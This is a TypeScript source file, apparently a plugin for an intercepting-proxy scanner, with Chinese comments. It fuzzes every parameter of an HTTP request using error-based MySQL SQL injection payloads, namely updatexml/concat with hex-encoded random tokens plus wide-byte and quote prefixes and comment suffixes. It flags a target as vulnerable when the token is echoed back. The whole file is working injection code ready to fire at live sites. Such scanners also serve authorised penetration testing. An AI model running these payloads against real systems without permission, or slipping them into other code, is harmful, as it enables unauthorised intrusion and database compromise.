import {Fuzz ,str,codec,HttpUtils} from '@24wings/core';
export async function endpoint(request: Request) {
    const fuzz = new Fuzz(request);
    const params = fuzz.getAllFuzzableParams();
    for (let param of params) {
        let [val, isNum] = [param.value, str.IsDigit(param.value)];
        var suffix = [" -- ", "#"]
        var prefix = sqlBuildPrefix(val)
        for (let suf of suffix) {
            for (let pre of prefix) {
                const [payload, token] = buildUpdateXML(pre, suf);
                const res = await fuzz.sendModifiedRequest(Object.assign(param, { value: payload }))
                let resHtml = await HttpUtils.dumpResponse(res);
                if (resHtml.includes(token)) {
                    console.log('有漏洞')
                }
            }
        }
    }
}


// FILEPATH: e:/deno_mitm/plugins/flow-analyzer/plugins/sql-error-based.yak
/**
 * 生成 UpdateXML SQL 注入 payload
 * @param pre 前缀
 * @param suf 后缀
 * @returns 元组 [payload, token]
 */
export function buildUpdateXML(pre: string, suf: string): [string, string] {
    const rand1 = randomString(10);
    const rand2 = randomString(10);
    const token = rand1 + rand2;
  
    const p1 = "and updatexml(1, concat(0x307e,";
    const payload = `0x${codec.encodeToHex(rand1)}, 0x${codec.encodeToHex(rand2)}`;
    const p2 = "), 1)";
  
    return [pre + p1 + payload + p2 + suf, token];
  }
  
/**
 * 生成 SQL 注入前缀
 * @param paramValue 参数值
 * @returns SQL 注入前缀数组
 */
export function sqlBuildPrefix(paramValue: string): string[] {
    const pureInt = str.IsDigit(paramValue)
  
    const wideByte = String.fromCharCode(Math.floor(Math.random() * (254 - 129 + 1)) + 129);
    const prefix: string[] = [];
  
    const valueList = [paramValue];
    const boundaryList = [" ", ")", "))"];
  
    let formatString = "%s";
    if (!pureInt) {
      formatString += wideByte + "'";
      valueList.push(randomString(10));
    }
    formatString += "%s";
  
    for (const v of valueList) {
      for (const b of boundaryList) {
        prefix.push(formatString.replace(/%s/g, (match, index) => index === 0 ? v : b));
      }
    }
  
    return prefix;
  }
  
  /**
   * 生成指定长度的随机字符串
   * @param length 字符串长度
   * @returns 随机字符串
   */
  function randomString(length: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array(length).fill(0).map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
  }
  